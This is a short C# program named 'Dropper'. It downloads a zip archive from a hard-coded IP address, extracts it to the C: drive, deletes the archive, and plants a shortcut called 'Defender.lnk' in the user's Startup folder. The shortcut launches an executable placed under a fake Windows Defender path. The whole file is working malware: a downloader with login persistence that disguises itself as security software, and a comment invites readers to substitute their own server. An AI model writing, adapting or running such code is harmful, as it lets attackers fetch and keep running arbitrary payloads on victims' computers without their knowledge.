using System;
using System.Net;
using System.IO.Compression;
using System.Runtime.InteropServices;
namespace Dropper
{
    class Hello
    {
        static void Main()
        {

            using (var client = new WebClient())
            {
                client.DownloadFile("http://37.139.28.209/hi.zip", "hi.zip"); //This is the IP for my private server on DigitalOcean
            }                                                                 //remember to replace with yours.
            string user = Environment.UserName;
            string dir_ = "C:/Users/";
            string dir__ = "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
            string f = dir_ + user + dir__;
            string lnk_ = "Defender.lnk";
            string s = f + lnk_;
            ZipFile.ExtractToDirectory("hi.zip", "C:/");
            System.IO.File.Delete("hi.zip");
            Type t = Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8")); //this is the GUID for a shell process.
            dynamic shell = Activator.CreateInstance(t);
            try
            {
                var lnk = shell.CreateShortcut(s);
                try
                {
                    lnk.TargetPath = @"C:\WindowsDefender\run.exe";
                    lnk.IconLocation = "shell32.dll, 1";
                    lnk.Save();
                }
                finally
                {
                    Marshal.FinalReleaseComObject(lnk);
                }
            }
            finally
            {
                Marshal.FinalReleaseComObject(shell);
            }
        }
    }
}
